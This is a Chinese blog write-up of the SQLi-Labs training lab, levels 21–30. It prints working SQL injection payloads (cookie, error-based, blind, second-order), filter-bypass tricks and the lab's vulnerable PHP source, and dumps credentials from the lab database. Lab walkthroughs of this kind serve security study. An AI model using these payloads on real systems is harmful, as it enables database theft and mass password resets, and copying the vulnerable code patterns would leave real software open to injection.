---
title: "SQLi-Labs 通关笔记（三）：Less-21 ~ Less-30"
date: 2026-08-20 00:00:00 +0800
categories: [SQL注入, 漏洞复现]
tags: [sqli-labs, SQL注入, MySQL, 二次注入, 过滤绕过]
---

本篇汇总 SQLi-Labs 第 21~30 关，覆盖 Cookie 注入、二次注入与过滤绕过等。

## Less-21

这一关与第二十关差不多，uname=后面的admin变成了YWRtaW4=，看来是加密了
![pasted image 20260817093433](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817093433.png)

用了base64
![pasted image 20260817093817](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817093817.png)
这一关闭合方式为 ') 单引号加括号，payload如下
') and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), 1, 30)),1)#
编码后：JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLHN1YnN0cigoc2VsZWN0IGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkpLCAxLCAzMCkpLDEpIw==
![pasted image 20260817100738](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817100738.png)

总之payload与上一关差不多，就多了一个括号，然后进行了base64编码
剩下的payload我就不写了
...

## Less-22

这一关还是差不多，可能还是闭合方式不同，我们试试
![pasted image 20260817100935](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817100935.png)

双引号"成功闭合 `" #` 的base64编码为IiAj
![pasted image 20260817101502](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817101502.png)

检验一下是否能偷出数据
" and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), 1, 30)),1)#
base64编码：IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2Usc3Vic3RyKChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSksIDEsIDMwKSksMSkj
可以带出数据，接下来就不多说了，payload参考上一关
![pasted image 20260817101214](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817101214.png)

## Less-23

第23关，get类型的注入
![pasted image 20260817102046](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817102046.png)

使用单引号触发报错
![pasted image 20260817102450](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817102450.png)

看报错信息，应该是单引号的字符型注入了
但是无论怎么注释都闭合不了
![pasted image 20260817103034](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817103034.png)

那我们不注释了，尝试另一种闭合方式
尝试了一下，果然可以
payload：?id=1' or '1'='1
![pasted image 20260817103311](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817103311.png)

?id=-1'union select 1,2,3 or '1'='1进行尝试，得知字段数为3，且第二个字段和第三个字段为回显位置(将id弄成一个负数的值，使前面的语句失效)
这里解释一下your password：这里结果是1，是因为`3 or '1'='1`加上sql语句中原本就有的 ' 形成`3 or '1'='1'` 这是一个逻辑或和逻辑为真，结果当然是1
![pasted image 20260817103749](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817103749.png)

?id=-1' union select 1,version(),3 or '1'='1
![pasted image 20260817104936](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817104936.png)

?id=-1' union select 1,group_concat(table_name),group_concat(table_name) from information_schema.tables where table_schema=database() and '1'='1
UNION 操作非法字符集排序规则混合，这是字符集不匹配？
![pasted image 20260817111327](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817111327.png)

算了，我们不用联合注入了，试试报错注入
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and '1'='1
![pasted image 20260817111915](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817111915.png)

可以，继续爆字段
?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'users'),0x7e),1) and '1'='1
![pasted image 20260817112619](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817112619.png)

爆具体存的值
?id=1' and updatexml(1,concat(0x7e,SUBSTR((select group_concat(0x7e,username,0x7e,password) from users),1,30),0x7e),1) and '1'='1
![pasted image 20260817113756](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817113756.png)

## Less-24

第24关，让我登录之后继续？
![pasted image 20260817113821](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817113821.png)

先登录上去看看
改密码的界面？
![pasted image 20260817114651](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817114651.png)

没有思路，看一下源码吧
登录逻辑代码

```php
function sqllogin(){
   $username = mysql_real_escape_string($_POST["login_user"]);
   $password = mysql_real_escape_string($_POST["login_password"]);
   $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
   $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( ');
   $row = mysql_fetch_row($res);
   if ($row[1]) {
            return $row[1];
   } else {
              return 0;
   }
}
```

注册逻辑代码

```php
$username=  mysql_escape_string($_POST['username']) ;
$pass= mysql_escape_string($_POST['password']);
$re_pass= mysql_escape_string($_POST['re_password']);

echo "<font size='3' color='#FFFF00'>";
$sql = "select count(*) from users where username='$username'";
$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
$row = mysql_fetch_row($res);
```

修改密码处代码

```php
# Validating the user input........
$username= $_SESSION["username"];
$curr_pass= mysql_real_escape_string($_POST['current_password']);
$pass= mysql_real_escape_string($_POST['password']);
$re_pass= mysql_real_escape_string($_POST['re_password']);

if($pass==$re_pass)
{
    $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
    $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
    $row = mysql_affected_rows();
}
```

看了上面的源码，很明显是二次注入
用户名经过转义成功存入数据库
改密码业务中读取该用户名，直接拼接 UPDATE SQL，忘记对读取出来的数据转义
我们可以先注册一个账户为admin' or 1=1#的账号
在更改密码时，更改密码的逻辑就会变成
此时更改密码不需要原来的密码，并且一次性更改数据库所有密码

```php
$sql = "UPDATE users SET PASSWORD='$pass' where username='admin' or 1=1# and password='$curr_pass' ";
```

![pasted image 20260817135552](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817135552.png)

在数据库中验证一下
ok成功了，密码全改了
![pasted image 20260817143145](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817143145.png)

## Less-25 / 25a

## 第25关
![pasted image 20260817143414](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817143414.png)

提示如上，意思应该是or和and被过滤了
我们试试绕过
首先这一关是有回显的，我们可以进行union注入
![pasted image 20260817143649](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817143649.png)

?id=-1' union select 1,database(),version()--+
查到数据库名称和版本
![pasted image 20260817143833](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817143833.png)

接下来查看一下有哪些表
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
报错了，下面显示了过滤后的内容，可以看出来information_schema中的or也被过滤了
![pasted image 20260817144130](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817144130.png)

我们绕过一下，payload如下
?id=-1' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+
![pasted image 20260817145041](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817145041.png)

查了一下 `Illegal mix of collations for operation 'UNION'`含义是UNION 两边对应列的**排序规则 collation 不兼容** 
可以用`CONVERT(xxx USING latin1)`强制转换 collation，适配原表字符集
payload如下：

```
?id=-1' union select 1,2,convert(group_concat(table_name) using latin1) from infoorrmation_schema.tables where table_schema=convert(database() using latin1)--+
```

![pasted image 20260817145522](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817145522.png)

爆字段的payload如下

```
?id=-1' union select 1,2,convert(group_concat(column_name) using latin1) from infoorrmation_schema.columns where table_name='users' anandd table_schema=convert(database() using latin1)--+
```

![pasted image 20260817151337](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817151337.png)

看内容
?id=-1' union select 1,2,group_concat(0x5c,username,0x5c,passwoorrd) from users--+
![pasted image 20260817151452](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260817151452.png)

```
\Dumb\22,\Angelina\22,\Dummy\22,\secure\22,\stupid\22,\superman\22,\batman\22,\admin\22,\\22,\blue\22,\bluek\22,\admin' or 1=1#\22
```

## 第25a关
与上一关提示一样，过滤了所有的or和and
![pasted image 20260819094247](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819094247.png)

这一关与上一关回显方式是一样的
只不过闭合方法不一样，没有单引号
查数据库名称和版本：?id=-1 union select 1,database(),version()--+
![pasted image 20260819095011](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819095011.png)


这一关只是比上一关payload中少一个单引号，剩下的一模一样，就不列举了
...

## Less-26 / 26a

## 第26关
此关卡翻译：**所有空格、所有注释，都被我们过滤没收了**。
- Spaces = 普通空格
- Comments = `# 、-- 、/* */` 全部注释符号
![pasted image 20260819142348](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819142348.png)

虽然提示是过滤了空格和注释，但是实际上不止这些，源码如下
是过滤掉了所有的or，and，注释，空白字符，转义符

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```

这里查了一下\s是 PCRE 正则预定义的一部分空白集合，其中包括
- 普通空格 (0x20)
- `\t` tab 制表 (0x09)
- `\n` 换行 (0x0A)
- `\r` 回车 (0x0D)
- `\f` 换页 (0x0C)
但是这里漏掉了下面这两个，这就是这关的突破点
- `\v` 垂直制表符 `0x0b` -> URL 编码：`%0b`
- 不间断空格 NBSP `0xa0` -> URL 编码 `%A0`
我们尝试使用payload：?id=-1'%A0union%A0select%A01,database(),version()--+
出现下方的报错，这是因为在 Windows 下会有无法用特殊字符代替空格的问题，这是 Apache 解析的问题，Linux 下无这个问题
![pasted image 20260819155239](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819155239.png)

这里没办法使用空白字符了，不能使用union注入，但是我们可以使用报错注入
真正能用的半角竖线 `|`（管道符，SQL 注入`||`用的）（ASCII 十六进制：**0x7C**）
payload：
?id=-1'||updatexml(1,concat(0x7e,database(),0x7e,version()),1)||'1'='1
![pasted image 20260819162459](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819162459.png)

思路就是这样个思路，后续爆表爆字段就是简单改一下以前的payload，这里我就不重复了
## 第26a关

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");

// take the variables 
if(isset($_GET['id']))
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;

// connectivity 
	$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		//print_r(mysql_error());
		//⭐⭐⭐这里注释了mysql_error()，就是说即使SQL执行报错，PHP也不会输出MySQL错误信息！updatexml报错注入拿不到回显！
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}




function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}



?>
```

从源码中可以看出这里注释了mysql_error()，就是说即使SQL执行报错，PHP也不会输出MySQL错误信息！updatexml报错注入拿不到回显！
所以我们这一关只能使用布尔盲注
payload: `?id=')%26%26length(database())>=8%26%26('1'='1`
![pasted image 20260819185927](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819185927.png)
![pasted image 20260819185947](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819185947.png)

猜数据库名称首字母
`?id=-1')%26%26ascii(substr(database(),1,1))=115%26%26('1'='1`
![pasted image 20260819191145](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819191145.png)

套路类似，就不列举了

## Less-27 / 27a

## 第27关
这一关显示使用不了union和select
![pasted image 20260819191251](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819191251.png)

```php
function blacklist($id){  
$id= preg_replace('/[\/\*]/',"", $id); //strip out /*  
$id= preg_replace('/[--]/',"", $id); //Strip out --.    
$id= preg_replace('/[#]/',"", $id); //Strip out #.    
$id= preg_replace('/[ +]/',"", $id); //Strip out spaces.    
$id= preg_replace('/select/m',"", $id); //Strip out spaces.    
$id= preg_replace('/[ +]/',"", $id); //Strip out spaces.     
$id= preg_replace('/union/s',"", $id); //Strip out union    
$id= preg_replace('/select/s',"", $id); //Strip out select    
$id= preg_replace('/UNION/s',"", $id); //Strip out UNION     
$id= preg_replace('/SELECT/s',"", $id); //Strip out SELECT    
$id= preg_replace('/Union/s',"", $id); //Strip out Union   
$id= preg_replace('/Select/s',"", $id); //Strip out select  
return $id;  
}
```

使用单引号闭合发现报错，这一关使用单引号字符型的报错注入
![pasted image 20260819191719](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819191719.png)

爆库：`?id=1'and(updatexml(1,concat(0x7e,database(),0x7e),1)) and '1'='1`
![pasted image 20260819191908](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819191908.png)

爆表，这一题中说select被过滤了，那就试试大小写绕过，payload如下：
`?id=1'||updatexml(1,concat(0x7e,(selEcT(group_concat(table_name))from(information_schema.tables)where(table_schema='security')),0x7e),1)||'1'='1`
![pasted image 20260819192051](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819192051.png)

爆字段
`?id=1'|| updatexml(1,concat(0x7e,(selEcT(group_concat(column_name))from(information_schema.columns)where(table_schema='security')),0x7e),1)||'1'='1`
![pasted image 20260819192251](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819192251.png)

爆密码
`?id=1'|| updatexml(1,concat(0x7e,(selEcT(group_concat(password))from(users)),0x7e),1)||'1'='1`
![pasted image 20260819192417](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819192417.png)

## 第27a关
也是union和select用不了
![pasted image 20260819204400](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819204400.png)

源码中注释了mysql_error()，用不了报错注入
但是过滤union和select的规则是有漏洞的，并且这里只过滤了空格，没有过滤其他空白字符，我们这一关可以使用大小写绕过和union注入

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");

// take the variables 
if(isset($_GET['id']))
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;
	$id = '"' .$id. '"';

// connectivity 
	$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		//print_r(mysql_error());
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		//Strip out --.
$id= preg_replace('/[#]/',"", $id);			//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	    //Strip out union
$id= preg_replace('/select/s',"", $id);	    //Strip out select
$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
$id= preg_replace('/Select/s',"", $id);	    //Strip out Select
return $id;
}
?>
```

爆库payload：`?id="%0aunIon%0aSelEct%0a1,database(),2%0a||"1"="1`
![pasted image 20260819210331](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819210331.png)

爆表名
`?id=0"%0aunIon%0aSelEct%0a1,unhex(hex(group_concat(table_name))),2%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security'%0aand%0a"1"="1`
![pasted image 20260820000513](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260820000513.png)

爆字段名`?id=0"%0aunIon%0aSelEct%0a1,unhex(hex(group_concat(column_name))),2%0afrom%0ainformation_schema.columns%0awhere%0atable_name='users'%0aand%0atable_schema='security'%0aand%0a"1"="1`
![pasted image 20260819235847](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819235847.png)

爆密码
`?id=0"%0aunIon%0aSelEct%0a1,group_concat(0x5c,username,0x5c,password),2%0afrom%0ausers%0awhere%0a1=1%0aand%0a"1"="1`
![pasted image 20260820000829](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260820000829.png)

```
\Dumb\22,\Angelina\22,\Dummy\22,\secure\22,\stupid\22,\superman\22,\batman\22,\admin\22,\\,\blue\22,\bluek\22,\admin' or 1=1#\22
```

## Less-28 / 28a

## 第28关
28关如下，依旧屏蔽了union和select
![pasted image 20260819214829](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819214829.png)

`?id=1`,`?id=1"`显示 ，`?id=1'`不显示
`?id=1')||'1'=('1`正确显示页面,说明有()，是单引号加括号注入
这里过滤了union select的连续组合，并且大小写不敏感，但是都没有单独过滤，这里可以考虑双写绕过

```php
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
$id= preg_replace('/[--]/',"", $id);				//Strip out --.
$id= preg_replace('/[#]/',"", $id);					//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
return $id;
}
```

爆库
`?id=')unIunion%0aselecton%0asEleCt%0a1,database(),2||('1'='1`
⭐补充：这里其实有另一种绕过`$id= preg_replace('/union\s+select/i',"", $id);`的方法，更简单一点，就是使用union all select，这样就可以让其不连续
![pasted image 20260819215639](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819215639.png)

爆表
`?id=')unIunion%0aselecton%0asEleCt%0a1,unhex(hex(group_concat(table_name))),2%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security'%0aand%0a('1'='1`
![pasted image 20260819232658](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819232658.png)

爆字段
`?id=')unIunion%0aselecton%0asEleCt%0a1,unhex(hex(group_concat(column_name))),2%0afrom%0ainformation_schema.columns%0awhere%0atable_name='users'%0aand%0atable_schema='security'%0aand%0a('1'='1`
![pasted image 20260819234428](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819234428.png)

爆账号密码
`?id=')unIunion%0aselecton%0asEleCt%0a1,group_concat(0x5c,username,0x5c,password),2%0afrom%0ausers%0awhere%0a1=1%0aand%0a('1'='1`
![pasted image 20260819233730](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819233730.png)

```
\Dumb\22,\Angelina\22,\Dummy\22,\secure\22,\stupid\22,\superman\22,\batman\22,\admin\22,\\,\blue\22,\bluek\22,\admin' or 1=1#\22
```

## 第28a关
第28a关其实和第28关差不多，两关可以共用一个payload的
爆库
`?id=')unIunion%0aselecton%0asEleCt%0a1,database(),2||('1'='1`
![pasted image 20260819233914](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819233914.png)

爆表
`?id=')unIunion%0aselecton%0asEleCt%0a1,unhex(hex(group_concat(table_name))),2%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security'%0aand%0a('1'='1`
![pasted image 20260819234549](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819234549.png)
爆字段
`?id=')unIunion%0aselecton%0asEleCt%0a1,unhex(hex(group_concat(column_name))),2%0afrom%0ainformation_schema.columns%0awhere%0atable_name='users'%0aand%0atable_schema='security'%0aand%0a('1'='1`
![pasted image 20260819234618](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819234618.png)
爆账号密码
`?id=')unIunion%0aselecton%0asEleCt%0a1,group_concat(0x5c,username,0x5c,password),2%0afrom%0ausers%0awhere%0a1=1%0aand%0a('1'='1`
![pasted image 20260819234647](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260819234647.png)

## Less-29

本网站受到世界最强防火墙保护？
![pasted image 20260820001607](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260820001607.png)

这关很容易就能发现是反引号字符型注入
然后爆库
`?id=' union select 1,version(),database() --+`
![pasted image 20260820002256](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260820002256.png)

爆表
`?id=' union select 1,unhex(hex(group_concat(table_name))),3 from information_schema.tables where table_schema='security' --+`
![pasted image 20260820003017](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260820003017.png)

爆字段
`?id=' union select 1,unhex(hex(group_concat(column_name))),3 from information_schema.columns where table_schema='security' and table_name='users'--+`
![pasted image 20260820003505](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260820003505.png)

爆账号密码
`?id=' union select 1,unhex(hex(group_concat(username))),unhex(hex(group_concat(password))) from security.users where 1 --+`
![pasted image 20260820003234](/assets/img/posts/2026-08-20-sqli-labs-less-21-30/pasted-image-20260820003234.png)

不是，我数据都拿完了，都没感受到防火墙的存在，我们欣赏一下源码
这个waf检查了输入是不是纯数字，不是就进行else分支，然后重定向，但是原本的脚本就没有停止，sql语句继续执行，这个防护就形同虚设啊

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
//disable error reporting
error_reporting(0);

// take the variables 
if(isset($_GET['id']))
{
	$qs = $_SERVER['QUERY_STRING'];
	$hint=$qs;
	$id1=java_implimentation($qs);
	$id=$_GET['id'];
	//echo $id1;
	whitelist($id1);
	
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);
	

// connectivity 
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		print_r(mysql_error());
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}




//WAF implimentation with a whitelist approach..... only allows input to be Numeric.
function whitelist($input)
{
	$match = preg_match("/^\d+$/", $input);
	if($match)
	{
		//echo "you are good";
		//return $match;
	}
	else
	{	
		header('Location: hacked.php');
		//echo "you are bad";
	}
}



// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).
function java_implimentation($query_string)
{
	$q_s = $query_string;
	$qs_array= explode("&",$q_s);


	foreach($qs_array as $key => $value)
	{
		$val=substr($value,0,2);
		if($val=="id")
		{
			$id_value=substr($value,3,30); 
			return $id_value;
			echo "<br>";
			break;
		}

	}

}

```

## Less-30

思路payload与29关完全一致，只是闭合方式是双引号
payload如下

爆库
`?id=" union select 1,version(),database() --+`

爆表
`?id=" union select 1,unhex(hex(group_concat(table_name))),3 from information_schema.tables where table_schema='security' --+`

爆字段
`?id=" union select 1,unhex(hex(group_concat(column_name))),3 from information_schema.columns where table_schema='security' and table_name='users'--+`

爆账号密码
`?id=" union select 1,unhex(hex(group_concat(username))),unhex(hex(group_concat(password))) from security.users where 1 --+`
